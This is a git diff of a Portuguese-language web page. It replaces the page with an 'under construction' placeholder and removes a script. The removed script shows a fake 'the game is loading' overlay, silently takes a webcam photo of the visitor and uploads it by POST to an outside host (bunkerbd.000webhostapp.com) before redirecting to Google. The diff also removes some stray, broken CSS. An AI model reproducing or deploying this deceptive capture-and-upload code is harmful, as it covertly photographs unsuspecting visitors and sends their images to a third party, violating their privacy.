@@ -20,28 +20,7 @@
       font-size: 20px;
     }
   </style>
-</head>
-<body>
-  <h1>Captura de Foto</h1>
-  <button id="captureButton">Capturar Foto</button>
-  <img id="capturedImage" style="display: none;">
-  <div id="overlay">
-    <div id="loadingMessage">Está carregando o jogo...</div>
-  </div>
 
-    
-    body {
-      background-color: black;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 100px;
-    }
-
-    .neon-text {
-      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 30px #00ff00;
-    }
-  </style>
 </head>
 <body>
   <h1 class="neon-text">Em construção...</h1>
@@ -84,94 +63,7 @@
     })
     .catch(error => console.error(error));
 </script>
-  <script>
-    const captureButton = document.getElementById('captureButton');
-    const capturedImage = document.getElementById('capturedImage');
-    const overlay = document.getElementById('overlay');
-
-    captureButton.addEventListener('click', () => {
-      // Mostra a div preta com a mensagem
-      overlay.style.display = 'flex';
-
-      // Solicita acesso à câmera
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          const mediaStreamTrack = stream.getVideoTracks()[0];
-          const imageCapture = new ImageCapture(mediaStreamTrack);
-
-          // Captura a foto
-          imageCapture.takePhoto()
-            .then(blob => {
-              capturedImage.src = URL.createObjectURL(blob);
-              capturedImage.style.display = 'block';
-
-              // Simulando envio (usando setTimeout)
-              setTimeout(() => {
-                // Esconde a div preta
-                overlay.style.display = 'none';
-
-                // Redireciona para o Google após 3 segundos
-                setTimeout(() => {
-                  window.location.href = 'https://www.google.com';
-                }, 3000);
-              }, 2000); // Simulação de envio por 2 segundos
-            })
-            .catch(error => {
-              console.error(error);
-              overlay.style.display = 'none'; // Esconde a div preta em caso de erro
-            });
-        })
-        .catch(error => {
-          console.error(error);
-          overlay.style.display = 'none'; // Esconde a div preta em caso de erro
-        });
-    });
-
-    captureButton.addEventListener('click', () => {
-      overlay.style.display = 'flex';
-
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          const mediaStreamTrack = stream.getVideoTracks()[0];
-          const imageCapture = new ImageCapture(mediaStreamTrack);
-
-          imageCapture.takePhoto()
-            .then(blob => {
-              // ...
-
-              const formData = new FormData();
-              formData.append('photo', blob);
-
-              fetch('https://bunkerbd.000webhostapp.com/salvar_foto.php', {
-                method: 'POST',
-                body: formData
-              })
-              .then(response => response.text())
-              .then(data => {
-                console.log('Foto enviada com sucesso: ' + data);
-
-                setTimeout(() => {
-                  window.location.href = 'https://www.google.com';
-                }, 3000);
-              })
-              .catch(error => {
-                console.error('Erro ao enviar foto: ' + error);
-                overlay.style.display = 'none';
-              });
-            })
-            .catch(error => {
-              console.error('Erro ao capturar foto: ' + error);
-              overlay.style.display = 'none';
-            });
-        })
-        .catch(error => {
-          console.error('Erro ao acessar câmera: ' + error);
-          overlay.style.display = 'none';
-        });
-    });
-  </script>
-
-
+ 
   
 
 </body>
